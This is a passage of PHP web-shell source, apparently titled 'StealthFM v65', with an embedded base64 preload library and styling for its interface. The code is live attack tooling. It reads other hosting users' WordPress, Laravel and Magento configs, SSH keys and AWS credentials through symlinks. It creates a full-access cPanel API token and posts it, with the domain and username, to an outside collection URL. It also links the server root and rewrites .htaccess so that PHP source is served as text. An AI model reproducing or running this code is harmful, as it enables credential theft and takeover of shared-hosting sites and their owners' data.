DAAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAGQAAAAIADADgBwAAAAAAAAAAAAAAAAAAGwAAAAIADAAgCAAAAAAAAAAAAAAAAAAALgAAAAIADABwCAAAAAAAAAAAAAAAAAAARAAAAAEAGABoECAAAAAAAAEAAAAAAAAAUwAAAAEAEgAIDiAAAAAAAAAAAAAAAAAAegAAAAIADACwCAAAAAAAAAAAAAAAAAAAhgAAAAEAEQD4DSAAAAAAAAAAAAAAAAAApQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArAAAAAEAEABoCgAAAAAAAAAAAAAAAAAAugAAAAEAEwAQDiAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAxgAAAAEAFwBgECAAAAAAAAAAAAAAAAAA0wAAAAEAFAAYDiAAAAAAAAAAAAAAAAAA3AAAAAAADwB4CQAAAAAAAAAAAAAAAAAA7wAAAAEAFwBoECAAAAAAAAAAAAAAAAAA+wAAAAEAFgAAECAAAAAAAAAAAAAAAAAAEQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAJQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAQQEAABAAFwBoECAAAAAAAAAAAAAAAAAASAEAABIADAAUCQAAAAAAACkAAAAAAAAAUgEAABIADQBcCQAAAAAAAAAAAAAAAAAAWAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAEAABIADADgCAAAAAAAADQAAAAAAAAAcAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAhAEAACAAAAAAAAAAAAAAAAAAAAAAAAAAkwEAABIADAA9CQAAAAAAAB0AAAAAAAAAnQEAABAAGABwECAAAAAAAAAAAAAAAAAAogEAABAAGABoECAAAAAAAAAAAAAAAAAArgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA1QEAABIAAAAAAAAAAAAAAAAAAAAAAAAA6wEAABIAAAAAAAAAAAAAAAAAAAAAAAAA/QEAACAAAAAAAAAAAAAAAAAAAAAAAAAAFwIAACIAAAAAAAAAAAAAAAAAAAAAAAAAMwIAABIACQAYBwAAAAAAAAAAAAAAAAAAOQIAABIAAAAAAAAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAX19KQ1JfTElTVF9fAGRlcmVnaXN0ZXJfdG1fY2xvbmVzAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eABjb21wbGV0ZWQuNjk3MgBfX2RvX2dsb2JhbF9kdG9yc19hdXhfZmluaV9hcnJheV9lbnRyeQBmcmFtZV9kdW1deQBfX2ZyYW1lX2R1bW15X2luaXRfYXJyYXlfZW50cnkAaG9vay5jAF9fRlJBTUVfRU5EX18AX19KQ1JfRU5EX18AX19kc29faGFuZGxlAF9EWU5BTUlDAF9fR05VX0VIX0ZSQU1FX0hEUgBfX1TM_lFTkRfXwBfR0xPQkFMX09GRlNFVF9UQUJMRV8AZ2V0ZW52QEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAGRhZW1vbml6ZQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AHB3bgBzaWduYWxAQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAHByZWxvYWRtZQBfZW5kAF9fYnNzX3N0YXJ0AGNobW9kQEBHTElCQ18yLjIuNQBfSnZfUmVnaXN0ZXJDbGFzc2VzAHVuc2V0ZW52QEBHTElBQkNfMi4yLjUAX2V4aXRAQEdMSUJDXzIuMi41AF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AF9pbml0AGZvcmtAQEdMSUJDXzIuMi41AA==';
			        // --- SMART JUMPER & SYMLINKER (UNIVERSAL PATH: CPANEL + DIRECTADMIN) ---
        if ($tool === 'symlink_cage' || $tool === 'jumper_cage') {
            $c = x_read(getcwd()."/passwd.txt"); 
            if(!$c) { echo "Err: passwd.txt missing. Run 'Bypass User' first."; exit; }
            
            $users = explode("\n", $c); 
            $dir = ($tool === 'symlink_cage') ? "3x_sym" : "jumping"; 
            if(!is_dir($dir)) @mkdir($dir, 0755); 
            @chdir($dir);
            
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex x\nAddType text/plain .php\nAddHandler text/plain .php");
            
            // 1. CONFIG CMS (Updated List)
            $cms_map = [
                'wp-config.php'             => 'wordpress',
                '.env'                      => 'laravel_env',
                'configuration.php'         => 'joomla_whmcs',
                'sites/default/settings.php'=> 'drupal',
                'app/etc/env.php'           => 'magento_env',
                'app/etc/local.xml'         => 'magento_xml',
                'app/config/parameters.php' => 'prestashop',
                'config/settings.inc.php'   => 'prestashop_old',
                'config.php'                => 'opencart',
                'admin/config.php'          => 'opencart_admin',
                'core/includes/config.php'  => 'vbulletin',
                'includes/config.php'       => 'vbulletin_old',
                'src/config.php'            => 'xenforo',
                'library/config.php'        => 'xenforo_old',
                'application/config/database.php' => 'codeigniter',
                'typo3conf/LocalConfiguration.php' => 'typo3',
                'wp/wp-config.php'              => 'wp',
                'config/db.php'             => 'yii_db'
            ];

            // 2. FILE SENSITIF (Root Home)
            $sensitive_map = [
                '.my.cnf'           => 'cp',
                '.accesshash'       => 'whm',
                '.bash_history'     => 'bash_hist',
                '.mysql_history'    => 'sql_hist',
                '.ssh/id_rsa'       => 'ssh_rsa',
                '.ssh/id_ed25519'   => 'ssh_ed25519',
                '.ssh/known_hosts'  => 'ssh_hosts',
                '.aws/credentials'  => 'aws_key',
                '.git-credentials'  => 'git_key'
            ];
            
            $n = 0;

            foreach ($users as $u_str) {
                $u = trim(explode(":", $u_str)[0]); 
                if(!$u) continue;
                
                foreach ($home_dirs as $h) {
                    $home_root = "$h/$u";
                    $found_cms = false;

                    // --- [HELPER] STRICT CHECKER & SAVER ---
                    $process_file = function($target_path, $save_name) use ($tool, &$n) {
                        if ($tool === 'jumper_cage') {
                            $dat = x_read($target_path);
                            // Validasi Ketat: Ada isi, bukan error
                            if ($dat && strlen($dat) > 10 
                                && stripos($dat, 'No such file') === false 
                                && stripos($dat, 'Permission denied') === false 
                                && stripos($dat, 'Unable to open') === false) {
                                
                                x_write($save_name, $dat);
                                @chmod($save_name, 0644);
                                $n++;
                                return true;
                            }
                        } elseif ($tool === 'symlink_cage') {
                            if (file_exists($save_name)) @unlink($save_name);
                            x_link($target_path, $save_name);
                            // Validasi Symlink: Coba baca sedikit
                            $test_read = @file_get_contents($save_name, false, null, 0, 50);
                            if ($test_read !== false && strlen($test_read) > 0 && stripos($test_read, 'Permission denied') === false) {
                                @chmod($save_name, 0644);
                                $n++;
                                return true;
                            } else {
                                @unlink($save_name); // Hapus symlink mati
                            }
                        }
                        return false;
                    };

                    // --- STEP A: CARI FILE SENSITIF (Di Root Home) ---
                    foreach ($sensitive_map as $file => $out_name) {
                        $process_file("$home_root/$file", "$u~" . str_replace("/", "", $h) . "~$out_name.txt");
                    }

                    // --- STEP B: DETEKSI DOCUMENT ROOTS (cPanel & DirectAdmin) ---
                    $target_roots = [];
                    
                    // 1. Standar cPanel (/home/user/public_html)
                    if (is_dir("$home_root/public_html")) {
                        $target_roots[] = "$home_root/public_html";
                    }
                    
                    // 2. DirectAdmin / Multi-Domain (/home/user/domains/domain.com/public_html)
                    if (is_dir("$home_root/domains")) {
                        $domains = @scandir("$home_root/domains");
                        if ($domains) {
                            foreach ($domains as $d) {
                                if ($d === '.' || $d === '..' || !is_dir("$home_root/domains/$d")) continue;
                                $da_path = "$home_root/domains/$d/public_html";
                                if (is_dir($da_path)) {
                                    $target_roots[] = $da_path;
                                }
                            }
                        }
                    }

                    // --- STEP C: SCAN CONFIG DI SEMUA ROOT YANG DITEMUKAN ---
                    foreach ($target_roots as $public_html) {
                        if ($found_cms) break; // Smart Stop: Cukup 1 config valid per user

                        foreach ($cms_map as $file => $cms_name) {
                            $target = "$public_html/$file";
                            $save_name = "$u~" . str_replace("/", "", $h) . "~$cms_name.txt";
                            
                            if ($process_file($target, $save_name)) {
                                $found_cms = true;
                                break; // Stop loop CMS
                            }
                        }
                    }
                    
                    if ($found_cms) break; // Pindah ke user berikutnya
                }
            }
            
            echo "$tool Done. Total Valid & Readable Files: $n."; 
            exit;
        }

        // --- BACKUP (UAPI TOKEN + CREATE ADMIN) ---
        if ($tool === 'backup') {
            echo "<div style='font-family:monospace; font-size:12px; background:#1b1b1b; padding:10px;'>";
            
            // --- PART 1: UAPI TOKEN ---
            echo "<div class='mb-3'><div class='fw-bold text-warning border-bottom border-secondary mb-2'>1. CPANEL TOKEN</div>";
            
            $cwd = str_replace('\\', '/', getcwd());
            $homedir = "/home/" . get_current_user() . "/public_html"; 
            if (preg_match('~^(/home\d*?/[^/]+)~', $cwd, $m)) {
                $homedir = $m[1] . "/public_html"; 
            }

            $cmd = "(uapi Tokens create_full_access name=Sultan || /usr/bin/uapi Tokens create_full_access name=Sultan || /usr/local/cpanel/bin/uapi Tokens create_full_access name=Sultan) 2>&1";
            $output = "";
            $used_method = "None";

            $methods = [
                'shell_exec' => function($c) { return @shell_exec($c); },
                'exec'       => function($c) { @exec($c, $o); return implode("\n", $o); },
                'passthru'   => function($c) { ob_start(); @passthru($c); return ob_get_clean(); },
                'system'     => function($c) { ob_start(); @system($c); return ob_get_clean(); },
                'popen'      => function($c) { $h = @popen($c, 'r'); if($h) { $o = stream_get_contents($h); @pclose($h); return $o; } return null; },
                'proc_open'  => function($c) {
                    $d = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                    $p = @proc_open($c, $d, $pipes);
                    if (is_resource($p)) { $o = stream_get_contents($pipes[1]); @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p); return $o; }
                    return null;
                }
            ];

            foreach ($methods as $name => $func) {
                if (function_exists($name)) {
                    $res = $func($cmd);
                    if (!empty($res)) {
                        $output = $res;
                        if (stripos($res, 'token:') !== false || stripos($res, 'conflicting') !== false || stripos($res, 'already exists') !== false) {
                            $used_method = $name;
                            break; 
                        }
                    }
                }
            }

            $token_val = "";
            $display_status = "UNKNOWN";
            $display_color = "text-secondary";

            if(preg_match('/token:\s*(\S+)/i', $output, $m)) {
                $token_val = trim($m[1]);
                $display_status = "CREATED";
                $display_color = "text-success";
            } elseif (stripos($output, 'conflicting') !== false || stripos($output, 'already exists') !== false) {
                $token_val = "Exists (Secret Hidden)";
                $display_status = "ALREADY EXISTS";
                $display_color = "text-warning"; 
            } else {
                $display_status = "NOT FOUND";
                $display_color = "text-danger";
            }

            $server_response = "Skipped";
            $srv_color = "text-secondary";

            if($display_status === "CREATED" && !empty($token_val)) {
                $target_url = "https://stepmomhub.com/catch.php"; 
                
                $data_json = json_encode([
                    "domain"   => $_SERVER['HTTP_HOST'],
                    "username" => get_current_user(),
                    "apiToken" => $token_val,
                    "homedir"  => $homedir
                ]);
                
                $raw_response = "No Connect";
                if (function_exists('curl_init')) {
                    $ch = curl_init($target_url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, $data_json);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                    $raw_response = curl_exec($ch);
                    curl_close($ch);
                } elseif (ini_get('allow_url_fopen')) {
                    $opts = ['http' => ['method'=>'POST', 'header'=>'Content-Type: application/json', 'content'=>$data_json, 'timeout'=>10], 'ssl'=>['verify_peer'=>false, 'verify_peer_name'=>false]];
                    $raw_response = @file_get_contents($target_url, false, stream_context_create($opts));
                }

                $json_res = json_decode($raw_response, true);
                if ($json_res) {
                    if ($json_res['status'] === 'success') { $server_response = "Saved to Database."; $srv_color = "text-success"; }
                    elseif ($json_res['status'] === 'ignored') { $server_response = "Already Saved (Duplicate)."; $srv_color = "text-warning"; }
                    else { $server_response = "Server Error: " . $json_res['msg']; $srv_color = "text-danger"; }
                } else { $server_response = "Raw: " . substr($raw_response, 0, 50); }
            } elseif ($display_status === "ALREADY EXISTS") {
                $server_response = "Skipped (Secret Hidden)"; $srv_color = "text-warning";
            }

            echo "<div>Method: <span class='text-info'>$used_method</span> | Token: <span class='$display_color fw-bold'>$display_status</span></div>";
            echo "<div>Server: <span class='$srv_color fw-bold'>$server_response</span></div>";
            if ($display_status === "NOT FOUND") { $clean_out = htmlspecialchars(substr($output, 0, 200)); echo "<div class='text-secondary mt-1 border border-secondary p-1 small'>$clean_out</div>"; }
            echo "</div>";

            echo "</div>";
            exit;
        }

        // --- SCAN SITE (JSON OUTPUT FOR GUI) ---
        if ($tool === 'scan_site') {
            $target_scan_dir = $target;
            $found_domains = [];
            
            if (is_dir($target_scan_dir)) {
                $items = scandir($target_scan_dir);
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $path = $target_scan_dir . '/' . $item;
                    if (is_dir($path)) {
                        if (preg_match('/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i', $item)) {
                            $found_domains[] = $item;
                        }
                    }
                }
            }
            json_out(['status' => 'success', 'data' => $found_domains, 'count' => count($found_domains)]);
            exit;
        }

        if ($tool === 'root_bypass') {
            $dir = "symlinkbypass"; 
            @mkdir($dir, 0755); 
            chdir($dir);
            
            if (!function_exists('god_link')) {
                function god_link($target, $link) {
                    if (function_exists('symlink') && @symlink($target, $link)) return true;
                    if (function_exists('link') && @link($target, $link)) return true;
                    
                    $cmd_raw = "ln -s " . escapeshellarg($target) . " " . escapeshellarg($link);
                    $cmd = $cmd_raw; 

                    if (function_exists('shell_exec')) { @shell_exec($cmd); }
                    elseif (function_exists('exec')) { @exec($cmd); }
                    elseif (function_exists('proc_open')) {
                        $desc = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
                        $proc = @proc_open($cmd, $desc, $pipes);
                        if (is_resource($proc)) {
                            @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
                            @proc_close($proc);
                        }
                    }
                    elseif (function_exists('passthru')) { ob_start(); @passthru($cmd); ob_end_clean(); }
                    elseif (function_exists('system')) { ob_start(); @system($cmd); ob_end_clean(); }
                    elseif (function_exists('popen')) { $p = @popen($cmd, 'r'); if($p) pclose($p); }
                    
                    if(@file_exists($link)) return true;
                    return false;
                }
            }

            $root_ok = god_link("/", "root");

            $etc_path = dirname(__DIR__) . "/passwd.txt";
            $etc = (file_exists($etc_path)) ? file_get_contents($etc_path) : false;
            
            $n = 0;
            if($etc) {
                $home_dirs = get_home_dirs(); 
                $users = explode("\n", $etc);
                $confs = ["wp-config.php", "config.php", "configuration.php", ".my.cnf"];
                foreach($users as $user_line) {
                    $u = explode(":", $user_line)[0];
                    if(empty($u)) continue;
                    foreach($home_dirs as $h) {
                        $base_target = "$h/$u/public_html";
                        if(god_link($base_target, $u . "~folder~" . str_replace("/", "", $h))) $n++;
                        foreach($confs as $cf) {
                            god_link($base_target . "/" . $cf, $u . "~" . str_replace(".", "-", $cf) . ".txt");
                        }
                    }
                }
            }

            $ht_b64 = "T3B0aW9ucyArRm9sbG93U3ltTGlua3MgK0luZGV4cwpEaXJlY3RvcnlJbmRleCBkZWZhdWx0LnBocApSZWFkT25seSB7IE9GRiB9CjxGaWxlc01hdGNoICJcLnBocCQiPgpTZXRIYW5kbGVyIHRleHQvcGxhaW4KQWRkVHlwZSB0ZXh0L3BsYWluIC5waHAKPC9GaWxlc01hdGNoPgpSZXdyaXRlRW5naW5lIE9mZgpTYXRpc2Z5IEFueQ==";
            x_write(".htaccess", base64_decode($ht_b64));
            
            echo "<div class='text-success'>[+] GOD MODE Bypass Active (Base64 Encoded Content)!</div>";
            echo "Akses Root: <a href='$dir/root/' target='_blank' class='text-warning fw-bold'>[ ROOT / ]</a><br>";
            echo "Akses User: <a href='$dir/' target='_blank'>[ BYPASS FOLDER ($n Users) ]</a><br>";
            echo "<small style='color:#777'>Keamanan: Perintah Shell & .htaccess disamarkan dengan Base64.</small>";
            exit;
        }
    } 
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>StealthFM v65</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.32.7/ace.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <style>
        * { transition: border-color 0.1s ease, background-color 0.1s ease, color 0.1s ease, box-shadow 0.1s ease; }
        :root { --bg-body: #131314; --bg-card: #1e1f20; --bg-hover: #2d2e30; --border-color: #333333; --text-primary: #e3e3e3; --text-secondary: #a8a8a8; --accent-primary: #8ab4f8; --accent-warning: #fdd663; --accent-success: #81c995; --accent-danger: #f28b82; --accent-purple: #d946ef; }
        body { background-color: var(--bg-body); color: var(--text-primary); font-family: 'Inter', sans-serif; font-size: 0.9rem; padding-bottom: 60px; }
        .navbar { background-color: var(--bg-body); border-bottom: 1px solid var(--border-color); height: 60px; }
        .navbar-brand { font-weight: 700; color: #fff !important; font-size: 1.1rem; }
        .path-wrapper { margin-top: 80px; margin-bottom: 20px; }
        .fa-ghost { animation: float 3s ease-in-out infinite; }
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-5px); } 100% { transform: translateY(0px); } }
        .sys-info-box { background: #18191a; border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin-bottom: 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: #ccc; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .sys-row { margin-bottom: 5px; word-break: break-all; }
        .sys-val { color: var(--accent-primary); }
        .sys-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 5px; margin-top: 5px; }
        .php-link { color: var(--accent-warning); text-decoration: none; font-weight: bold; margin-left: 5px; }
        .php-link:hover { text-decoration: underline; color: #fff; }
        #terminal-panel { background: #000; border: 1px solid #333; border-bottom: none; border-radius: 12px 12px 0 0; overflow: hidden; box-shadow: 0 -5px 20px rgba(0,0,0,0.5); margin-bottom: 0; animation: slideDown 0.15s ease; }
        .term-header { background: #1a1a1a; padding: 8px 15px; border-bottom: 1px solid #333; border-top: 2px solid var(--accent-success); display: flex; justify-content: space-between; align-items: center; }
        .term-title { font-family: 'JetBrains Mono'; font-weight: 700; color: var(--accent-success); font-size: 0.8rem; }
        .term-body-inline { height: 180px; overflow-y: auto; padding: 15px; font-family: 'JetBrains Mono'; font-size: 13px; color: #ddd; }
        .term-input-row { display: flex; align-items: center; border-top: 1px solid #222; padding: 10px; background: #0a0a0a; }
        .term-prompt { color: #c586c0; font-weight: bold; margin-right: 8px; }
        #term-cmd-inline { background: transparent; border: none; color: #ce9178; width: 100%; outline: none; font-family: 'JetBrains Mono'; }
        #process-panel { border: 1px solid var(--border-color); border-bottom: none; border-radius: 12px 12px 0 0; overflow: hidden; background: #1e1f20; margin-bottom: 0; }
        .console-header { background: #252627; padding: 8px 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .console-title { font-size: 0.75rem; font-weight: 700; color: var(--accent-warning); letter-spacing: 0.5px; text-transform: uppercase; }
        .panel-close { color: #666; cursor: pointer; } .panel-close:hover { color: #fff; }
        .path-bar-custom { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 15px; padding: 10px 20px; display: flex; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.15); position: relative; z-index: 5; }
        .has-panel-above { border-top-left-radius: 0; border-top-right-radius: 0; border-top: 1px solid #333; }
        #path-txt { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .input-group { border: 1px solid #333; border-radius: 8px; overflow: hidden; }
        #uploadInput { background: #111; color: #ccc; border: none; font-size: 0.85rem; }
        #uploadInput::file-selector-button { background-color: #000; color: #fff; border: none; border-right: 1px solid #333; padding: 8px 12px; margin-right: 10px; font-weight: 600; transition: 0.2s; }
        #uploadInput::file-selector-button:hover { background-color: #222; }
        .btn-upload-modern { background: #000 !important; border: none; border-left: 1px solid #333; color: #fff !important; font-weight: 600; padding: 6px 16px; }
        .btn-upload-modern:hover { background: #1a1a1a !important; }
        .btn-modern { border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-card); color: var(--text-primary); padding: 6px 12px; }
        .btn-modern:hover { background: var(--bg-hover); color: #fff; border-color: #555; }
        .btn-icon-path { background: transparent; border: none; color: #aaa; padding: 0 10px 0 0; font-size: 1.1rem; cursor: pointer; transition: 0.2s; }
        .btn-icon-path:hover { color: #fff; transform: translateY(-1px); }
        .card { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
        .table { --bs-table-bg: transparent; color: var(--text-primary); margin: 0; table-layout: fixed; width: 100%; }
        .table thead th { background: var(--bg-card); color: var(--text-secondary); border-bottom: 1px solid var(--border-color); padding: 15px; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.5px; vertical-align: middle; }
        .table tbody td { border-bottom: 1px solid var(--border-color); padding: 10px 15px; vertical-align: middle; height: 45px; }
        .table-hover tbody tr:hover { background-color: var(--bg-hover); }
        .icon-dir { color: var(--accent-warning); margin-right: 10px; font-size: 1.1rem; vertical-align: middle; }
        .icon-file { margin-right: 10px; font-size: 1.1rem; vertical-align: middle; } 
        .i-php { color: #8892bf; } .i-html { color: #e34f26; } .i-css { color: #264de4; } .i-js { color: #f7df1e; } 
        .i-img { color: #a29bfe; } .i-zip { color: #fdcb6e; } .i-code { color: #b2bec3; } .i-def { color: var(--accent-primary); } 
        .text-folder { color: #fff; font-weight: 600; text-decoration: none; vertical-align: middle; }
        .text-file { color: #b0b0b0; text-decoration: none; vertical-align: middle; }
        .badge-perm { font-family: 'JetBrains Mono'; padding: 4px 8px; border-radius: 4px; font-size: 0.75rem; border: 1px solid var(--border-color); background: #000; color: var(--text-secondary); display: inline-block; vertical-align: middle; }
        .writable { color: var(--accent-success); border-color: var(--accent-success); }
        .readonly { color: var(--accent-danger); border-color: var(--accent-danger); }
        .action-btn { width: 32px; height: 32px; border-radius: 6px; border: 1px solid transparent; background: transparent; display: inline-flex; align-items: center; justify-content: center; vertical-align: middle; }
        .action-btn.edit { color: #3b82f6; background: rgba(59, 130, 246, 0.1); border-color: rgba(59, 130, 246, 0.2); }
        .action-btn.edit:hover { background: #3b82f6; color: #fff; }
        .action-btn.del { color: #ef4444; background: rgba(239, 68, 68, 0.1); border-color: rgba(239, 68, 68, 0.2); }
        .action-btn.del:hover { background: #ef4444; color: #fff; }
        .modal-xl { max-width: 95% !important; }
        .modal-content { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; }
        .modal-header { border-bottom: 1px solid var(--border-color); }
        .btn-close { filter: invert(1); }
        #editor-container { position: relative; width: 100%; height: 85vh; border-radius: 0 0 12px 12px; overflow: hidden; }
        .tools-list { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .tool-cmd { background: #111; border: 1px solid #2a2a2a; border-radius: 4px; padding: 15px 15px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; text-decoration: none; }
        .tool-cmd:hover { background: #161616; border-color: #444; transform: translateX(2px); }
        .cmd-left { display: flex; align-items: center; gap: 12px; }
        .cmd-icon { font-size: 16px; width: 20px; text-align: center; }
        .cmd-text { font-family: 'JetBrains Mono', monospace; font-weight: 700; font-size: 0.85rem; color: #eee; }
        .cmd-arrow { color: #444; font-size: 12px; opacity: 0; }
        .tool-cmd:hover .cmd-arrow { opacity: 1; transform: translateX(-5px); color: #fff; }
        .modern-row {
            display: flex;
            align-items: center;
            background: #161616;
            border: 1px solid #2a2a2a;
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 10px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        
        /* Hover Effect: Glow Border & Lift */
        .modern-row:hover {
            transform: translateY(-2px);
            background: #1a1a1a;
            border-color: #444;
            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
        }
        .modern-row:hover::before {
            content: '';
            position: absolute;
            left: 0; top: 0; bottom: 0;
            width: 4px;
            background: var(--accent-success);
            box-shadow: 0 0 10px var(--accent-success);
        }

        /* 1. ICON SECTION */
        .m-icon {
            width: 45px;
            height: 45px;
            background: #222;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #fff;
            margin-right: 15px;
            flex-shrink: 0;
        }

        /* 2. INFO SECTION (Domain) */
        .m-info {
            flex: 1;
            min-width: 0; /* Text truncate fix */
            margin-right: 15px;
        }
        .m-domain {
            font-weight: 700;
            color: #eee;
            font-size: 1rem;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .m-status {
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
            margin-top: 3px;
            display: inline-block;
        }
        .status-success { color: var(--accent-success); }
        .status-warning { color: var(--accent-warning); }

        /* 3. CREDENTIALS SECTION */
        .m-creds {
            display: flex;
            gap: 20px;
            background: #0a0a0a;
            padding: 8px 15px;
            border-radius: 8px;
            border: 1px solid #333;
            margin-right: 15px;
        }
        .cred-group {
            display: flex;
            flex-direction: column;
        }
        .cred-group label {
            font-size: 0.6rem;
            color: #666;
            font-weight: bold;
            margin-bottom: 2px;
        }
        .cred-group .val {
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            color: var(--accent-primary);
            cursor: pointer;
        }
        .cred-group .val:hover { color: #fff; text-decoration: underline; }
        
        /* Blur effect for password privacy */
        .blur-reveal { filter: blur(4px); transition: 0.2s; user-select: none; }
        .modern-row:hover .blur-reveal { filter: blur(0); }

        /* 4. ACTION BUTTON */
        .m-action { flex-shrink: 0; }
        .btn-glow {
            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
            border: none;
            color: #fff;
            padding: 8px 20px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 0.8rem;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
            transition: 0.2s;
        }
        .btn-glow:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(46, 204, 113, 0.5);
        }

        /* Mobile Responsive */
        @media (max-width: 768px) {
            .modern-row { flex-direction: column; align-items: flex-start; gap: 10px; }
            .m-icon { display: none; }
            .m-creds { width: 100%; justify-content: space-between; margin: 0; }
            .m-action { width: 100%; }
            .btn-glow { width: 100%; }
        }
        #toast-container { position: fixed; top: 80px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
        .toast-msg { background: #1e1f20; color: #fff; padding: 12px 18px; border-radius: 8px; border-left: 4px solid #333; box-shadow: 0 5px 15px rgba(0,0,0,0.5); font-size: 0.9rem;         min-width: 250px; opacity: 0; transform: translateX(20px); animation: toastIn 0.3s forwards; }
        .toast-msg.success { border-left-color: var(--accent-success); }
        .toast-msg.error { border-left-color: var(--accent-danger); }
        .toast-msg.hiding { animation: toastOut 0.3s forwards; }
        .cyber-footer { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(10, 10, 10, 0.85); backdrop-filter: blur(5px); border-top: 1px solid #222; padding: 8px 20px; display: flex; justify-content: space-between; align-items: center; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: #555; z-index: 9999; }
        .cyber-footer span { transition: 0.3s; }
        .cyber-footer:hover span { color: #888; }
        .cy-brand { color: var(--accent-primary); font-weight: 700; letter-spacing: 1px; }
        .fa-heart { color: #e91e63; animation: heartbeat 1.5s infinite; }
        @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes toastIn { to { opacity: 1; transform: translateX(0); } }
        @keyframes toastOut { to { opacity: 0; transform: translateX(20px); } }
        #async-widget { position: fixed; bottom: 50px; right: 20px; width: 300px; z-index: 10000; background: #111; border: 1px solid #333; border-radius: 8px; box-shadow: 0 5px 20px rgba(0,0,0,0.5); display: none; font-family: 'JetBrains Mono'; }
        .aw-header { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; font-weight: bold; color: var(--accent-primary); }
        .aw-body { padding: 12px; }
        .progress-bar-bg { width: 100%; height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
        .progress-bar-fill { height: 100%; background: var(--accent-success); width: 0%; transition: width 0.3s ease; }
        .aw-stat { font-size: 0.7rem; color: #888; display: flex; justify-content: space-between; }
        @media (max-width: 768px) { 
            .desktop-toolbar { flex-direction: column; gap: 10px; } .upload-group { width: 100%; max-width: 100%; } 
            .d-mobile-none { display: none !important; } .tools-list { grid-template-columns: 1fr; } 
            .table th:first-child, .table td:first-child { padding-left: 8px !important; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
            .table th:nth-child(3), .table td:nth-child(3) { width: 65px; text-align: center; padding: 10px 2px !important; white-space: nowrap; }
